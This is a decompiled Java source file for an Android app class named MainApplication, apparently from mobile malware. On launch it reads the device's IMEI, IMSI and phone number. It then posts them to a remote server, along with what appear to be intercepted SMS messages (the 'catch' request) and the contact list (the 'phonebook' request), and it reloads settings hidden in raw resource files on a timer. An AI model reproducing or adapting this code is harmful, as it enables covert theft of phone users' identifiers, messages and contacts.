package com.load.wap;

import android.app.Application;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.SystemClock;
import java.io.PrintStream;
import java.io.StringReader;
import java.net.HttpURLConnection;
import java.util.LinkedList;
import java.util.List;
import org.apache.http.message.BasicNameValuePair;

public class MainApplication
  extends Application
{
  public static String a = "";
  public static String b = "";
  public static f c;
  public static String d;
  
  public MainApplication() {}
  
  public static e a()
  {
    try
    {
      Object localObject = c("callback");
      localObject = b.a(f.e.g, "POST", (List)localObject, new LinkedList(), false, null);
      if (localObject != null)
      {
        int i = ((HttpURLConnection)localObject).getResponseCode();
        System.out.println("getResponseCode: " + i);
        if (i == 200)
        {
          localObject = b.a(((HttpURLConnection)localObject).getInputStream());
          return localObject;
        }
      }
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
    return new e();
  }
  
  public static e a(String paramString1, String paramString2)
  {
    try
    {
      List localList = c("catch");
      localList.add(new BasicNameValuePair("number", paramString1));
      localList.add(new BasicNameValuePair("text", paramString2));
      paramString1 = b.a(f.e.g, "POST", localList, new LinkedList(), false, null);
      if ((paramString1 != null) && (paramString1.getResponseCode() == 200))
      {
        paramString1 = b.a(paramString1.getInputStream());
        return paramString1;
      }
    }
    catch (Exception paramString1)
    {
      paramString1.printStackTrace();
    }
    return new e();
  }
  
  public static void a(String paramString)
  {
    try
    {
      List localList = c("phonebook");
      paramString = b.a(f.e.g, "POST", localList, new LinkedList(), true, paramString);
      if (paramString != null)
      {
        System.out.println("getResponseCode: " + paramString.getResponseCode());
        paramString.disconnect();
      }
      return;
    }
    catch (Exception paramString)
    {
      paramString.printStackTrace();
    }
  }
  
  private void b(String paramString)
  {
    f.a(new StringReader(b.a(this, paramString)));
  }
  
  private static List c(String paramString)
  {
    LinkedList localLinkedList = new LinkedList();
    localLinkedList.add(new BasicNameValuePair("imei", a));
    localLinkedList.add(new BasicNameValuePair("imsi", b));
    localLinkedList.add(new BasicNameValuePair("time", String.valueOf(System.currentTimeMillis())));
    localLinkedList.add(new BasicNameValuePair("phone", d));
    localLinkedList.add(new BasicNameValuePair("version", f.e.c));
    localLinkedList.add(new BasicNameValuePair("sid", f.e.d));
    localLinkedList.add(new BasicNameValuePair("type", paramString));
    localLinkedList.add(new BasicNameValuePair("os", "android"));
    localLinkedList.add(new BasicNameValuePair("model", Build.MODEL));
    localLinkedList.add(new BasicNameValuePair("manufacturer", Build.MANUFACTURER));
    localLinkedList.add(new BasicNameValuePair("sdk", String.valueOf(Build.VERSION.SDK_INT)));
    return localLinkedList;
  }
  
  public void onCreate()
  {
    super.onCreate();
    System.out.println("MainApplication::onCreate()");
    a = f.c(this);
    b = f.e(this);
    d = f.d(this);
    c = new f();
    SystemClock.sleep(1000L);
    Object localObject;
    if (!f.a(this))
    {
      System.out.println("FIRST START!");
      b("/res/raw/start.xml");
      f.e.f = (System.currentTimeMillis() + f.e.f * f.a);
      localObject = c;
      f.b(this);
    }
    for (;;)
    {
      localObject = f.e;
      b.a(this, f.e.f);
      System.out.println("START OK!");
      return;
      if (System.currentTimeMillis() > f.e.f)
      {
        System.out.println("settings.saved.wait: " + f.e.f);
        System.out.println("settings.saved.period: " + f.e.e);
        if (f.e.e == 0L)
        {
          b("/res/raw/icon.png");
          f.e.f = (System.currentTimeMillis() + f.e.f * f.a);
        }
        f.e.f = (System.currentTimeMillis() + f.e.e * f.a);
        localObject = c;
        f.b(this);
      }
    }
  }
}
